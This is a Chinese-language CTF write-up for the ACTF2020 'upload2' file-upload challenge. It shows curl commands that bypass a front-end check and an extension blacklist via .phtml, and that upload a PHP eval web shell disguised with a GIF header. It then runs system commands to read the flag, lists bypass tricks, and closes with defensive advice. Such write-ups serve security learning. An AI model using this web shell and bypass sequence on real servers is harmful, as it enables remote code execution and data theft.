# [ACTF2020 新生赛]upload2

## 题目信息

- 题目类型：文件上传漏洞
- 服务器：openresty (nginx) + PHP 5.6.40
- 目标：http://2ac2adb1-af92-4b3d-bf61-0029f2a18591.node5.buuoj.cn:81/

## 解题过程

### 1. 信息收集

访问目标页面，发现是一个文件上传表单，前端 JS 限制了只能上传 `.jpg`、`.png`、`.gif` 文件。

但前端限制只是客户端的，可以用 `curl` 直接发送 POST 请求绕过。

查看上传页面的前端校验代码 `./js/main.js`:

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    var allow_ext = ".jpg|.png|.gif";
    var ext_name = file.substring(file.lastIndexOf("."));
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "该文件不允许上传，请上传jpg、png、gif结尾的图片噢！";
        alert(errMsg);
        return false;
    }
}
```

### 2. 测试服务端黑名单

用 curl 直接绕过前端限制，测试各种后缀：

```shell
# 尝试上传 .php —— 被拦截
echo '<?php phpinfo();?>' > /tmp/test.php
curl -s -F "upload_file=@/tmp/test.php" -F "submit=upload" http://.../
# 返回: nonono~ Bad file！

# 尝试上传 .php5 —— 被拦截
echo '<?php phpinfo();?>' > /tmp/test.php5
curl -s -F "upload_file=@/tmp/test.php5" -F "submit=upload" http://.../
# 返回: nonono~ Bad file！

# 尝试上传 .php3 —— 被拦截
echo '<?php phpinfo();?>' > /tmp/test.php3
curl -s -F "upload_file=@/tmp/test.php3" -F "submit=upload" http://.../
# 返回: nonono~ Bad file！

# 尝试上传 .phtml —— 成功！PHP代码被执行
echo '<?php phpinfo();?>' > /tmp/test.phtml
curl -s -F "upload_file=@/tmp/test.phtml" -F "submit=upload" http://.../
# 返回: Upload Success! Look here~ ./uplo4d/xxx.phtml
```

**关键发现：** `.phtml` 后缀成功通过服务端校验，并且可以执行 PHP 代码。

说明服务端用的是黑名单过滤，只拦截 `.php`、`.php3`、`.php4`、`.php5` 等常见后缀，但没有拦截 `.phtml`。

> `.phtml` 是 PHP 支持的另一种后缀名，在部分服务器配置中可以被解析执行 PHP 代码。

### 3. 确认PHP环境状态

访问上传的 `.phtml` 页面查看 phpinfo 获得关键信息：

```shell
curl -s http://.../uplo4d/xxx.phtml
```

关键信息：
- `disable_functions` = **no value**（没有任何函数被禁用）
- `open_basedir` = **no value**（没有目录访问限制）
- `Document_ROOT` = `/var/www/html`

### 4. 上传 Webshell

```shell
# 创建包含 GIF 文件头的小马，绕过可能的内容检查
echo 'GIF89a<?php @eval($_POST["cmd"]);?>' > /tmp/shell.phtml
curl -s -F "upload_file=@/tmp/shell.phtml" -F "submit=upload" http://.../
# 返回: Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml
```

### 5. 获取Flag

```shell
# 列出根目录
curl -s -X POST -d "cmd=system('ls -la /');" \
  http://.../uplo4d/bd914ca4997d34857501cefab0064162.phtml
# 发现 /flag 文件

# 读取 flag
curl -s -X POST -d "cmd=system('cat /flag');" \
  http://.../uplo4d/bd914ca4997d34857501cefab0064162.phtml
```

**Flag:** `flag{a074881a-5854-4864-9534-f9c713fe4041}`

## 知识点总结

### 1. 文件上传绕过技术

| 绕过方式 | 说明 |
|---------|------|
| 前端JS绕过 | 直接构造 POST 请求，不经过浏览器 |
| 扩展名黑名单绕过 | 使用 `.phtml`、`.php5`、`.shtml` 等替代后缀 |
| 文件头绕过 | 添加 `GIF89a` 等图片文件头骗过 `getimagesize()` 等函数 |
| 双写扩展名 | `a.php.jpg`、`a.jpg.php` |
| 大小写绕过 | `.PHP`、`.Php` |
| 末尾特殊字符 | 空格、点、`::$DATA`(Windows) |

### 2. 常见PHP可解析后缀

PHP 可解析的后缀不仅限于 `.php`，还包括：
- `.php3`、`.php4`、`.php5`、`.php7`（不同PHP版本）
- `.phtml`（PHP + HTML混编）
- `.pht`
- `.shtml`（需服务器配置）

### 3. 检查服务器环境

通过 phpinfo() 可以获取：
- `disable_functions`：被禁用的PHP函数
- `open_basedir`：目录访问限制
- `Document_ROOT`：Web根目录路径
- `allow_url_include`：是否允许远程文件包含

### 4. curl 上传文件命令

```shell
curl -s -F "upload_file=@/path/to/file" -F "submit=upload" URL
```

- `-F` 表示 form 数据，`@` 表示文件内容
- 文件名会保留原文件名

## 防御建议

1. 使用**白名单**而非黑名单校验文件扩展名
2. 使用 `finfo` 或 `getimagesize()` 验证文件 MIME 类型
3. 上传文件重命名，不使用用户提供的文件名
4. 文件存储目录设置为不可执行脚本
5. 使用 `.htaccess` 限制上传目录的 PHP 解析
